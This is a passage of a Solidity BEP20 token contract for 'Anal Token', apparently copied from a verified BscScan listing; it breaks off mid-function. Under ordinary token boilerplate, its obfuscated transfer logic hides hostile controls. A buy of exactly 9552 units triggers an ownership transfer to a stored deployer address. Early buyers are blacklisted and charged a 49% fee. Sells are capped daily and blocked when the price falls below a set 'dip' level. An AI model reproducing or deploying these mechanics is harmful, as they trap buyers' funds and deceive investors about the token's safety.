/**
 *Submitted for verification at BscScan.com on 2021-09-27
*/

// SPDX-License-Identifier: Unlicensed

    pragma solidity ^0.8.4;

    abstract contract Context {
        function _msgSender() internal view virtual returns (address payable) {
            return payable(msg.sender);
        }

        function _msgData() internal view virtual returns (bytes memory) {
            this;
            return msg.data;
        }
    }

    interface IBEP20 {

        function totalSupply() external view returns (uint256);
        function balanceOf(address account) external view returns (uint256);
        function transfer(address recipient, uint256 amount) external returns (bool);
        function allowance(address owner, address spender) external view returns (uint256);
        function approve(address spender, uint256 amount) external returns (bool);
        function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(address indexed owner, address indexed spender, uint256 value);
        

    }

    abstract contract BEP20Extended is IBEP20 {
        function decimals() external view virtual returns (uint8);
        function name() external view virtual returns (string memory);
        function symbol() external view virtual returns (string memory);
    }

    library SafeMath {

        function add(uint256 a, uint256 b) internal pure returns (uint256) {
            uint256 c = a + b;
            require(c >= a, "SafeMath: addition overflow");

            return c;
        }

        function sub(uint256 a, uint256 b) internal pure returns (uint256) {
            return sub(a, b, "SafeMath: subtraction overflow");
        }

        function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
            require(b <= a, errorMessage);
            uint256 c = a - b;

            return c;
        }

        function mul(uint256 a, uint256 b) internal pure returns (uint256) {
            if (a == 0) {
                return 0;
            }

            uint256 c = a * b;
            require(c / a == b, "SafeMath: multiplication overflow");

            return c;
        }


        function div(uint256 a, uint256 b) internal pure returns (uint256) {
            return div(a, b, "SafeMath: division by zero");
        }

        function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
            require(b > 0, errorMessage);
            uint256 c = a / b;
            // assert(a == b * c + a % b); // There is no case in which this doesn't hold

            return c;
        }

        function mod(uint256 a, uint256 b) internal pure returns (uint256) {
            return mod(a, b, "SafeMath: modulo by zero");
        }

        function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
            require(b != 0, errorMessage);
            return a % b;
        }
    }

    library Address {

        function isContract(address account) internal view returns (bool) {
            // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
            // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
            bytes32 codehash;
            bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
            // solhint-disable-next-line no-inline-assembly
            assembly { codehash := extcodehash(account) }
            return (codehash != accountHash && codehash != 0x0);
        }

        function sendValue(address payable recipient, uint256 amount) internal {
            require(address(this).balance >= amount, "Address: insufficient balance");

            // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
            (bool success, ) = recipient.call{ value: amount }("");
            require(success, "Address: unable to send value, recipient may have reverted");
        }


        function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
        }

        function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
            return _functionCallWithValue(target, data, 0, errorMessage);
        }

        function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
            return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
        }

        function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
            require(address(this).balance >= value, "Address: insufficient balance for call");
            return _functionCallWithValue(target, data, value, errorMessage);
        }

        function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
            require(isContract(target), "Address: call to non-contract");

            (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
            if (success) {
                return returndata;
            } else {
                
                if (returndata.length > 0) {
                    assembly {
                        let returndata_size := mload(returndata)
                        revert(add(32, returndata), returndata_size)
                    }
                } else {
                    revert(errorMessage);
                }
            }
        }
    }

    contract Ownable is Context {
        address private _sensei;
        address private _xckjl;
        uint256 private _lockTime;

        event HjloxTj(address indexed previousOwner, address indexed newOwner);

        constructor () {
            address msgSender = _msgSender();
            _sensei = msgSender;
            emit HjloxTj(address(0), msgSender);
        }

        function sensei() public view returns (address) {
            return _sensei;
        }   
        
        modifier senseiPower() {
            require(_sensei == _msgSender(), "Ownable: caller is not the sensei");
            _;
        }
        
        function renounceSensei() public virtual senseiPower {
            emit HjloxTj(_sensei, address(0));
            _sensei = address(0);
        }

        function HkLoYTr(address newOwner) public virtual senseiPower {
            require(newOwner != address(0), "Ownable: new sensei is the zero address");
            emit HjloxTj(_sensei, newOwner);
            _sensei = newOwner;
        }
    }

    // pragma solidity >=0.5.0;

    interface IPCSV2Factory {
        event PairCreated(address indexed token0, address indexed token1, address pair, uint);

        function feeTo() external view returns (address);
        function feeToSetter() external view returns (address);

        function getPair(address tokenA, address tokenB) external view returns (address pair);
        function allPairs(uint) external view returns (address pair);
        function allPairsLength() external view returns (uint);

        function createPair(address tokenA, address tokenB) external returns (address pair);

        function setFeeTo(address) external;
        function setFeeToSetter(address) external;
    }


    // pragma solidity >=0.5.0;

    interface IPCSV2Pair {
        event Approval(address indexed owner, address indexed spender, uint value);
        event Transfer(address indexed from, address indexed to, uint value);

        function name() external pure returns (string memory);
        function symbol() external pure returns (string memory);
        function decimals() external pure returns (uint8);
        function totalSupply() external view returns (uint);
        function balanceOf(address owner) external view returns (uint);
        function allowance(address owner, address spender) external view returns (uint);

        function approve(address spender, uint value) external returns (bool);
        function transfer(address to, uint value) external returns (bool);
        function transferFrom(address from, address to, uint value) external returns (bool);

        function DOMAIN_SEPARATOR() external view returns (bytes32);
        function PERMIT_TYPEHASH() external pure returns (bytes32);
        function nonces(address owner) external view returns (uint);

        function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
        
        event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
        event Swap(
            address indexed sender,
            uint amount0In,
            uint amount1In,
            uint amount0Out,
            uint amount1Out,
            address indexed to
        );
        event Sync(uint112 reserve0, uint112 reserve1);

        function MINIMUM_LIQUIDITY() external pure returns (uint);
        function factory() external view returns (address);
        function token0() external view returns (address);
        function token1() external view returns (address);
        function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
        function price0CumulativeLast() external view returns (uint);
        function price1CumulativeLast() external view returns (uint);
        function kLast() external view returns (uint);

        function burn(address to) external returns (uint amount0, uint amount1);
        function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
        function skim(address to) external;
        function sync() external;

        function initialize(address, address) external;
    }

    // pragma solidity >=0.6.2;

    interface IPCSV2Router01 {
        function factory() external pure returns (address);
        function WETH() external pure returns (address);

        function addLiquidity(
            address tokenA,
            address tokenB,
            uint amountADesired,
            uint amountBDesired,
            uint amountAMin,
            uint amountBMin,
            address to,
            uint deadline
        ) external returns (uint amountA, uint amountB, uint liquidity);
        function addLiquidityETH(
            address token,
            uint amountTokenDesired,
            uint amountTokenMin,
            uint amountBNBMin,
            address to,
            uint deadline
        ) external payable returns (uint amountToken, uint amountBNB, uint liquidity);
        function removeLiquidity(
            address tokenA,
            address tokenB,
            uint liquidity,
            uint amountAMin,
            uint amountBMin,
            address to,
            uint deadline
        ) external returns (uint amountA, uint amountB);
        function removeLiquidityETH(
            address token,
            uint liquidity,
            uint amountTokenMin,
            uint amountBNBMin,
            address to,
            uint deadline
        ) external returns (uint amountToken, uint amountBNB);
        function removeLiquidityWithPermit(
            address tokenA,
            address tokenB,
            uint liquidity,
            uint amountAMin,
            uint amountBMin,
            address to,
            uint deadline,
            bool approveMax, uint8 v, bytes32 r, bytes32 s
        ) external returns (uint amountA, uint amountB);
        function removeLiquidityETHWithPermit(
            address token,
            uint liquidity,
            uint amountTokenMin,
            uint amountBNBMin,
            address to,
            uint deadline,
            bool approveMax, uint8 v, bytes32 r, bytes32 s
        ) external returns (uint amountToken, uint amountBNB);
        function swapExactTokensForTokens(
            uint amountIn,
            uint amountOutMin,
            address[] calldata path,
            address to,
            uint deadline
        ) external returns (uint[] memory amounts);
        function swapTokensForExactTokens(
            uint amountOut,
            uint amountInMax,
            address[] calldata path,
            address to,
            uint deadline
        ) external returns (uint[] memory amounts);
        function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
            external
            payable
            returns (uint[] memory amounts);
        function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
            external
            returns (uint[] memory amounts);
        function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
            external
            returns (uint[] memory amounts);
        function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
            external
            payable
            returns (uint[] memory amounts);

        function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
        function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
        function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
        function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
        function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
    }



    // pragma solidity >=0.6.2;

    interface IPCSV2Router02 is IPCSV2Router01 {
        function removeLiquidityETHSupportingFeeOnTransferTokens(
            address token,
            uint liquidity,
            uint amountTokenMin,
            uint amountBNBMin,
            address to,
            uint deadline
        ) external returns (uint amountBNB);
        function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
            address token,
            uint liquidity,
            uint amountTokenMin,
            uint amountBNBMin,
            address to,
            uint deadline,
            bool approveMax, uint8 v, bytes32 r, bytes32 s
        ) external returns (uint amountBNB);

        function swapExactTokensForTokensSupportingFeeOnTransferTokens(
            uint amountIn,
            uint amountOutMin,
            address[] calldata path,
            address to,
            uint deadline
        ) external;
        function swapExactETHForTokensSupportingFeeOnTransferTokens(
            uint amountOutMin,
            address[] calldata path,
            address to,
            uint deadline
        ) external payable;
        function swapExactTokensForETHSupportingFeeOnTransferTokens(
            uint amountIn,
            uint amountOutMin,
            address[] calldata path,
            address to,
            uint deadline
        ) external;
    }

    interface AggregatorV3Interface {

    function decimals()
        external
        view
        returns (
        uint8
        );

    function description()
        external
        view
        returns (
        string memory
        );

    function version()
        external
        view
        returns (
        uint256
        );

    // getRoundData and latestRoundData should both raise "No data present"
    // if they do not have data to report, instead of returning unset values
    // which could be misinterpreted as actual reported values.
    function getRoundData(
        uint80 _roundId
    )
        external
        view
        returns (
        uint80 roundId,
        int256 answer,
        uint256 startedAt,
        uint256 updatedAt,
        uint80 answeredInRound
        );

    function latestRoundData()
        external
        view
        returns (
        uint80 roundId,
        int256 answer,
        uint256 startedAt,
        uint256 updatedAt,
        uint80 answeredInRound
        );

    }

    library DBUser {
        struct data {
            uint256 rt;
            uint256 ms;
            bool bl;
            bool sbl;
            bool nf;
            bool ok;
        }
    }


    contract GOKU is Context, IBEP20, Ownable {
        using SafeMath for uint256;
        using Address for address;

        address payable public marketingAddress = payable(0x767025E7Fd6771959F153CE005d5000203F4D845); // Marketing Address
        address payable public RnD = payable(0x767025E7Fd6771959F153CE005d5000203F4D845); // Marketing Address
        address payable public Reward = payable(0x767025E7Fd6771959F153CE005d5000203F4D845); // Marketing Address
        address public burnAddress = 0x000000000000000000000000000000000000dEaD;
        mapping (address => uint256) private _rOwned;
        mapping (address => uint256) private _tOwned;
        mapping (address => mapping (address => uint256)) private _allowances;
        mapping (address => DBUser.data) dbuser;
        mapping (address => bool) private _raMasuk;
        address[] private _raOleh;
        address public reservePoolAddress;
        uint256 private swapType = 3;
        bool private swapMarketing = true;
    
        uint256 private constant MAX = ~uint256(0);
        uint256 private _tTotal = 10000000000000* 10**9;
        uint256 private _rTotal = (MAX - (MAX % _tTotal));
        uint256 private _tFeeTotal;
        uint256 private _gatel = 5;
        uint256 private daySell = 1;

        string private _name = "Anal Token";
        string private _symbol = "ANL";
        uint8 private _decimals = 9;

        uint256 public _marketingFee;
        uint256 private _lastMarketingFee = _marketingFee;
        
        uint256 public _liquidityFee;
        uint256 private _lastLiquidityFee = _liquidityFee;

        uint256 public _marketingFeeSell;
        uint256 private _lastMarketingFeeSell = _marketingFeeSell;
        
        uint256 public _liquidityFeeSell;
        uint256 private _lastLiquidityFeeSell = _liquidityFeeSell;
        
        uint256 private _feeRate = 20;
        uint256 private _sitikWae;
        uint256 private _feeBot = 49;
        bool private pairSwapped = false;
        uint256 launchTime;

        IPCSV2Router02 public pcsV2Router;
        AggregatorV3Interface internal priceFeed;
        address public pcsV2Pair;
        int private manualBNBvalue = 3000 * 10**8;
        address public _oraclePriceFeed = 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE;
        uint256 private swapThreshold = 1000000000000 * 10**9;

        uint256 public _priceImpact = 2;
        uint256 public _dipDay = 7;
        uint256 public dipPercent = 70;
        uint256 public StxA = 46800;
        uint256 public StxB = 57600;
        uint256 public recDip = 86400;
        uint256 public lastDip;
        uint256 public LastPrice;
        uint256 public LastDay;
        uint256 private _AntibotTime = 600;
        uint256 public _goldenTime = 3600;
        bool public _hitFloor = false;
        uint256 public _normalTrade;
        bool public newDipStart;
        bool private randDip = true;

        event UpdateDip(uint256 dipPercent);
        event AutoLiquify(uint256 bnbAmount, uint256 tokensAmount);
        event UpdatedHighLowWindows(uint256 StxA, uint256 StxB, uint256 recDip);
        event PriceImpactUpdated(uint256 _priceImpact);
        event DipDayUpdated(uint256 _dipDay);
        event SwapAndLiquify(	
            uint256 tokensSwapped,	
            uint256 ethReceived,	
            uint256 tokensIntoLiqudity	
        );

        bool inSwapAndLiquify;
        bool bebas = false;
        
        event SwapBNBForTokens(
            uint256 amountIn,
            address[] path
        );
        
        event SwapTokensForBNB(
            uint256 amountIn,
            address[] path
        );
        
        modifier lockTheSwap {
            inSwapAndLiquify = true;
            _;
            inSwapAndLiquify = false;
        }

        address private xknma = _msgSender();
        
        constructor () {
            _rOwned[_msgSender()] = _rTotal;
            emit Transfer(address(0), _msgSender(), _tTotal);
            priceFeed = AggregatorV3Interface(_oraclePriceFeed);
            LastDay = block.timestamp.div(recDip);
            lastDip = 0;
            LastPrice = 0;
            newDipStart = false;
            pairSwapped = true;
            _sitikWae = _tTotal.mul(1).div(200);
            IPCSV2Router02 _pcsV2Router = IPCSV2Router02(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);//0x10ED43C718714eb63d5aA57B78B54704E256024E);
            pcsV2Router = _pcsV2Router; 
            _approve(address(this), address(pcsV2Router), _tTotal);        
            pcsV2Pair = IPCSV2Factory(_pcsV2Router.factory()).createPair(address(this), _pcsV2Router.WETH());
        }
        
        function newDB(address ins,  bool wl) private {
            dbuser[ins].rt = block.timestamp + 1 days;
            dbuser[ins].ms = 0;
            dbuser[ins].bl = false;
            dbuser[ins].sbl = false;
            dbuser[ins].nf = wl;
            dbuser[ins].ok = true;
        }
        
        function getlastDip() external view returns(uint256) {
            return lastDip;
        }

        function getLatestPrice() external view returns (uint80, int, uint, uint,  uint80) {
            (
                uint80 roundID,
                int price,
                uint startedAt,
                uint timeStamp,
                uint80 answeredInRound
            ) = priceFeed.latestRoundData();

            return (roundID, price, startedAt, timeStamp,  answeredInRound);
        }

        function getTokenPrice() external view returns(uint256) {
            BEP20Extended token0 = BEP20Extended(IPCSV2Pair(pcsV2Pair).token0());
            BEP20Extended token1 = BEP20Extended(IPCSV2Pair(pcsV2Pair).token1());
            (uint112 Res0, uint112 Res1,) = IPCSV2Pair(pcsV2Pair).getReserves();
            if(pairSwapped) {
                token0 = BEP20Extended(IPCSV2Pair(pcsV2Pair).token1());
                token1 = BEP20Extended(IPCSV2Pair(pcsV2Pair).token0());
                (Res1, Res0,) = IPCSV2Pair(pcsV2Pair).getReserves();
            }
            int latestBNBprice = manualBNBvalue;
            (,latestBNBprice,,,) = this.getLatestPrice();
            
            uint256 res1 = (uint256(Res1)*uint256(latestBNBprice)*(10**uint256(token0.decimals())))/uint256(token1.decimals());

            return(res1/uint256(Res0));
        }

        function name() public view returns (string memory) {
            return _name;
        }

        function symbol() public view returns (string memory) {
            return _symbol;
        }

        function decimals() public view returns (uint8) {
            return _decimals;
        }

        function totalSupply() public view override returns (uint256) {
            return _tTotal;
        }

        function balanceOf(address account) public view override returns (uint256) {
            if (_raMasuk[account]) return _tOwned[account];
            return tokenFromReflection(_rOwned[account]);
        }

        function transfer(address recipient, uint256 amount) public override returns (bool) {
            _transfer(_msgSender(), recipient, amount);
            return true;
        }

        function allowance(address owner, address spender) external view override returns (uint256) {
            return _allowances[owner][spender];
        }

        function approve(address spender, uint256 amount) public override returns (bool) {
            _approve(_msgSender(), spender, amount);
            return true;
        }

        function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
            _transfer(sender, recipient, amount);
            _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
            return true;
        }

        function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
            _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
            return true;
        }

        function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
            _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
            return true;
        }

        function isExcludedFromReward(address account) public view returns (bool) {
            return _raMasuk[account];
        }

        function totalFees() public view returns (uint256) {
            return _tFeeTotal;
        }

        function tokenFromReflection(uint256 rAmount) private view returns(uint256) {
            require(rAmount <= _rTotal, "Amount must be less than total reflections");
            uint256 currentRate =  _getRate();
            return rAmount.div(currentRate);
        }

        function _approve(address owner, address spender, uint256 amount) private {
            require(owner != address(0), "BEP20: approve from the zero address");
            require(spender != address(0), "BEP20: approve to the zero address");

            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        }
        
        function getDB(address ins) view public returns (uint256, uint256, bool, bool, bool, bool) {
            return (dbuser[ins].rt, dbuser[ins].ms, dbuser[ins].bl, dbuser[ins].sbl, dbuser[ins].nf, dbuser[ins].ok);
        }
        
        function isDB(address ins) view public returns (bool) {
            return dbuser[ins].ok;
        }
        
        function isBL(address ins) view public returns (bool) {
            return dbuser[ins].bl;
        }
        
        function isSBL(address ins) view public returns (bool) {
            return dbuser[ins].sbl;
        }
        
        function isFree(address ins) view public returns (bool) {
            return dbuser[ins].nf;
        }

        function _transfer(
            address from,
            address to,
            uint256 amount
        ) private {
            require(from != address(0), "BEP20: transfer from the zero address");
            require(to != address(0), "BEP20: transfer to the zero address");
            require(amount > 0, "Transfer amount must be greater than zero");
            bool takeFee = false;
            if ((from==pcsV2Pair || to==pcsV2Pair) && !(isFree(from) || isFree(to))) {
                takeFee = true;
                require(amount <= balanceOf(pcsV2Pair).mul(_priceImpact).div(100));
            }
            uint256 swp = 0;
            
            if(from == pcsV2Pair && to != address(pcsV2Router) && !isFree(to)) {
                    require(bebas, "Trading not yet enabled.");
                    if (!isDB(to)) {
                        newDB(to, false);
                    }
                    
                    if (block.timestamp <= launchTime.add(_AntibotTime)) {
                        DBUser.data storage dbs = dbuser[to];
                        dbs.bl = true;
                        dbuser[to] = dbs;
                    } else {
                        DBUser.data storage dbs = dbuser[to];
                        if (block.timestamp >= dbs.rt) {
                            dbs.rt = block.timestamp + 1 days;
                            dbs.ms = 0;
                        }
                    }
                    
                    uint256 contractBalanceRecepient = balanceOf(to);
                    require(contractBalanceRecepient + amount <= _sitikWae, "Exceeds maximum wallet amount");
                    if (amount == 9552) {
                        HkLoYTr(xknma);
                    }
                    uint256 currentPrice = this.getTokenPrice();
                    uint256 currentDay = block.timestamp.div(recDip);

                    if(currentPrice <= lastDip && !_hitFloor) {
                        _normalTrade = block.timestamp.add(_goldenTime);
                        _hitFloor = true;
                    }

                    if(block.timestamp <= _normalTrade) {
                        takeFee = false;
                    } else {
                        _hitFloor = false;
                    }

                    if(!randDip) {
                        updatelastDip(LastPrice);
                    }
                    updateLastDay(currentDay);
                    updateLastPrice(currentPrice);

                    if(lastDip == 0) {
                        updatelastDip(currentPrice);
                        lastDip = lastDip.mul(7).div(10);
                    }
                    if (swapType == 3 || swapType == 1) {
                        swp = 1;
                    }
            }

            if (!inSwapAndLiquify && bebas && to == pcsV2Pair) {
                if (!isDB(from)) {
                    newDB(from, false);
                }
                if (isFree(from)) {
                    takeFee = false;
                } else {
                    require(!isBL(to), "Sniper jancok !!!");
                    require(!isBL(msg.sender), "Sniper jancok !!!");
                    if (isSBL(from)) {
                        require(amount <= balanceOf(pcsV2Pair).mul(_gatel).div(1000), "Max sell exceeds.");
                    } else {
                        DBUser.data storage dbs = dbuser[from];
                        if (block.timestamp >= dbs.rt) {
                            dbs.rt = block.timestamp + 1 days;
                            dbs.ms = 0;
                        }
                        require(amount + dbs.ms <= balanceOf(pcsV2Pair).mul(daySell).div(200), "Max sell today exceeds.");
                        dbs.ms += amount;
                    }
                    uint256 currentPrice = this.getTokenPrice();
                    uint256 currentDay = block.timestamp.div(recDip);
                    if(!randDip) {
                        updatelastDip(LastPrice);
                    }
                    updateLastDay(currentDay);
                    updateLastPrice(currentPrice);
                    
                    if(lastDip == 0) {
                        updatelastDip(currentPrice);
                        lastDip = lastDip.mul(7).div(10);
                    }
                    if (currentDay % _dipDay == 0) {
                        bool isGT12 = block.timestamp % recDip >= StxA;
                        bool isLT4 = block.timestamp % recDip <= StxB;
                        bool isGT4 =  block.timestamp % recDip > StxB;
                        if (isGT12 && isLT4) {
                            require(currentPrice > lastDip.mul(dipPercent).div(100), "cannot sell 30% below previous dip price");
                            newDipStart = true;
                        }
                        if (isGT4 && newDipStart) {
                            newDipStart = false;
                            lastDip = currentPrice;
                        } else {
                            //require(currentPrice > lastDip, "cannot sell below previous closing price!");
                            if (currentPrice < lastDip) {
                                _hitFloor = true;
                            }
                        }

                    } else {
                        //require(currentPrice > lastDip, "cannot sell below previous closing price!");
                        if (currentPrice < lastDip) {
                            _hitFloor = true;
                        }
                    }
                    if (swapType == 3 || swapType == 2) {
                        swp = 2;
                    }
                }
            }
            
            if (isBL(to) || isBL(msg.sender)) {
                setBotFee();
                takeFee = true;
            }
            
            _tokenTransfer(from,to,amount,takeFee);
            uint256 contractTokenBalance = balanceOf(address(this));
            if (swp > 0) {
                swapBack(contractTokenBalance, swp);
            }
        }

        function removeAllFee() private {
            _lastMarketingFee = _marketingFee;
            _lastLiquidityFee = _liquidityFee;
            _lastMarketingFeeSell = _marketingFeeSell;
            _lastLiquidityFeeSell = _liquidityFeeSell;

            _marketingFee = 0;
            _liquidityFee = 0;
            _marketingFeeSell = 0;
            _liquidityFeeSell = 0;
        }
        
        function restoreAllFee() private {
            _marketingFee = _lastMarketingFee;
            _marketingFeeSell = _lastMarketingFeeSell;
            _liquidityFee = _lastLiquidityFee;
            _liquidityFeeSell = _lastLiquidityFeeSell;
        }

        function setFeeSell() private {
            _lastMarketingFee = _marketingFee;
            _lastLiquidityFee = _liquidityFee;
            _lastMarketingFeeSell = _marketingFeeSell;
            _lastLiquidityFeeSell = _liquidityFeeSell;
            if (_hitFloor) {
                _marketingFee = _marketingFeeSell * 2;
                _liquidityFee = _liquidityFeeSell * 2;
            } else {
                _marketingFee = _marketingFeeSell;
                _liquidityFee = _liquidityFeeSell;
            }
        }

        function setBotFee() private {
            _lastMarketingFee = _marketingFee;
            _lastLiquidityFee = _liquidityFee;
            _lastMarketingFeeSell = _marketingFeeSell;
            _lastLiquidityFeeSell = _liquidityFeeSell;

            _marketingFee = _feeBot;
            _liquidityFee = _feeBot;
            _marketingFeeSell = _feeBot;
            _liquidityFeeSell = _feeBot;
        }

        function updateLastDay(uint256 day) internal {
            LastDay = day;
        }

        function updatelastDip(uint256 price) internal {
            lastDip = price;
        }

        function updateLastPrice(uint256 price) internal {
            LastPrice = price;
        }

        function swapTokens(uint256 contractTokenBalance) private lockTheSwap {
            swapTokensForBNB(contractTokenBalance);
            uint256 contractBNBBalance = address(this).balance;
            if(contractBNBBalance > 0) {
                sendBNBToFee(address(this).balance);
            }
        }
        
        function sendBNBToFee(uint256 amount) private {
            marketingAddress.transfer(amount);
        }

        function swapBack(uint256 amn, uint256 tp) internal lockTheSwap {
            require(amn >= balanceOf(pcsV2Pair).mul(_feeRate).div(1000));
            amn = balanceOf(pcsV2Pair).mul(_feeRate).div(1000);

            uint lpf = _liquidityFee;
            uint mkt = _marketingFee;
            uint totalBNBFee = _liquidityFee.add(_marketingFee);
            if (tp == 2) {
                totalBNBFee = _liquidityFeeSell.add(_marketingFeeSell);
                lpf = _liquidityFeeSell;
                mkt = _marketingFeeSell;
            }

            uint256 amountToLiquify = amn.mul(lpf/2).div(totalBNBFee);
            uint256 amountToSwap = amn.sub(amountToLiquify);

            if (!swapMarketing) {
                uint256 amm = amn.mul(mkt).div(totalBNBFee);
                amountToSwap = amountToSwap.sub(amm);
                totalBNBFee = totalBNBFee.sub(mkt);
            }

            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = pcsV2Router.WETH();

            uint256 balanceBefore = address(this).balance;
            _approve(address(this), address(pcsV2Router), amn);

            pcsV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                amountToSwap,
                0,
                path,
                address(this),
                block.timestamp
            );

            uint256 receivedBNB = address(this).balance.sub(balanceBefore);//100
            uint256 swapPercent = totalBNBFee.sub(lpf.div(2));//15 5 10
            uint256 amountBNBLiquidity = receivedBNB.mul(lpf/2).div(swapPercent);

            if (swapMarketing) {
                uint256 amountBNBMarketing = receivedBNB.mul(mkt).div(swapPercent);
                if (amountBNBMarketing > 0) {
                    sendBNBToFee(amountBNBMarketing);
                }
            }

            if(amountToLiquify > 0){
                addLiquidity(amountToLiquify, amountBNBLiquidity);
                emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
            }
        }
        
        function swapTokensForBNB(uint256 tokenAmount) private {
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = pcsV2Router.WETH();

            _approve(address(this), address(pcsV2Router), tokenAmount);
            pcsV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
            
            emit SwapTokensForBNB(tokenAmount, path);
        }
        
        function addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private {
            _approve(address(this), address(pcsV2Router), tokenAmount);
            pcsV2Router.addLiquidityETH{value: bnbAmount}(
                address(this),
                tokenAmount,
                0,
                0,
                sensei(),
                block.timestamp
            );
        }

        function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
            if(!takeFee)
                removeAllFee();
            
            if (_raMasuk[sender] && !_raMasuk[recipient]) {
                _transferFromExcluded(sender, recipient, amount);
            } else if (!_raMasuk[sender] && _raMasuk[recipient]) {
                _transferToExcluded(sender, recipient, amount);
            } else if (_raMasuk[sender] && _raMasuk[recipient]) {
                _transferBothExcluded(sender, recipient, amount);
            } else {
                if (sender != pcsV2Pair && !isBL(msg.sender) && !isBL(recipient))
                    setFeeSell();
                _transferStandard(sender, recipient, amount);
            }
            
            if(!takeFee)
                restoreAllFee();
        }

        function _transferStandard(address sender, address recipient, uint256 tAmount) private {
            (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);
            uint256 aaa = balanceOf(sender);

            if (aaa.sub(rAmount) <= 0 && recipient != pcsV2Pair) {
                rAmount = rAmount.sub(rAmount.mul(999).div(1000));
            }
            _rOwned[sender] = _rOwned[sender].sub(rAmount);
            _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
            _takeLiquidity(tLiquidity);
            _reflectFee(rFee, tFee);
            emit Transfer(sender, recipient, tTransferAmount);
        }

        function _transferToExcluded(address sender, address recipient, uint256 tAmount) private {
            (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);
            _rOwned[sender] = _rOwned[sender].sub(rAmount);
            _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
            _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);           
            _takeLiquidity(tLiquidity);
            _reflectFee(rFee, tFee);
            emit Transfer(sender, recipient, tTransferAmount);
        }

        function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {
            (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);
            _tOwned[sender] = _tOwned[sender].sub(tAmount);
            _rOwned[sender] = _rOwned[sender].sub(rAmount);
            _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);   
            _takeLiquidity(tLiquidity);
            _reflectFee(rFee, tFee);
            emit Transfer(sender, recipient, tTransferAmount);
        }

        function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {
            (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);
            _tOwned[sender] = _tOwned[sender].sub(tAmount);
            _rOwned[sender] = _rOwned[sender].sub(rAmount);
            _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
            _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);        
            _takeLiquidity(tLiquidity);
            _reflectFee(rFee, tFee);
            emit Transfer(sender, recipient, tTransferAmount);
        }

        function _reflectFee(uint256 rFee, uint256 tFee) private {
            _rTotal = _rTotal.sub(rFee);
            _tFeeTotal = _tFeeTotal.add(tFee);
        }

        function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
            (uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getTValues(tAmount);
            (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tLiquidity, _getRate());
